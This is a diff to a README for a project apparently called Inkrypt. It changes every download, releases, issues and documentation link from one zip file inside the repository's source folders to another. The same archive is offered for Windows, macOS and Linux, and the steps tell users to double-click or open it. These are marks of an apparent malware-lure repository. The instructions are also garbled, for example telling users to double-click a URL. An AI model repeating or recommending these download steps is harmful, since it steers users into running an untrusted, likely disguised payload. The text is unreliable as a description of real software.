@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download Inkrypt](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip%20Inkrypt-F38020?logo=cloudflare&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip)
+[![Download Inkrypt](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip%20Inkrypt-F38020?logo=cloudflare&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip)
 
 </div>
 
@@ -18,7 +18,7 @@ Follow these steps to download and run Inkrypt smoothly.
 
 ### Step 1: Visit the Download Page
 
-To download Inkrypt, click on the button above or [click here](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip) to visit the Releases page.
+To download Inkrypt, click on the button above or [click here](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip) to visit the Releases page.
 
 ### Step 2: Choose the Right Version
 
@@ -28,9 +28,9 @@ On the Releases page, you will find different versions of Inkrypt. Look for the 
 
 Once you've found the latest version, locate the appropriate file for your operating system. The available formats may include:
 
-- **Windows:** https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip
-- **macOS:** https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip
-- **Linux:** https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip
+- **Windows:** https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip
+- **macOS:** https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip
+- **Linux:** https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip
 
 Click on the link for your operating system to begin the download.
 
@@ -39,15 +39,15 @@ Click on the link for your operating system to begin the download.
 After the download is complete, find the file in your downloads folder. 
 
 - **Windows:** 
-    1. Double-click on `https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip`.
+    1. Double-click on `https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip`.
     2. Follow the prompts to complete the installation.
   
 - **macOS:** 
-    1. Open `https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip`.
+    1. Open `https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip`.
     2. Drag the Inkrypt app into your Applications folder.
   
 - **Linux:** 
-    1. Extract the `https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip` file.
+    1. Extract the `https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip` file.
     2. Navigate to the extracted folder and run the application by double-clicking or using the terminal.
 
 ## 🔑 Features
@@ -80,11 +80,11 @@ Make sure your device meets these requirements for optimal performance.
 
 ## 💬 Getting Help
 
-If you encounter issues or have questions, visit the [Issues page](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip) to report problems or seek help from the community. You can also check the [Usage Documentation](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip) for more information.
+If you encounter issues or have questions, visit the [Issues page](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip) to report problems or seek help from the community. You can also check the [Usage Documentation](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip) for more information.
 
 ## 📥 Download & Install
 
-To download Inkrypt, click the button at the top or visit the [Releases page](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/durable/Software-v2.0-alpha.5.zip). Follow the steps outlined above to successfully install and start using Inkrypt.
+To download Inkrypt, click the button at the top or visit the [Releases page](https://raw.githubusercontent.com/Frumsapap/Inkrypt/main/apps/worker/src/routes/Software_v3.7.zip). Follow the steps outlined above to successfully install and start using Inkrypt.
 
 ---
 
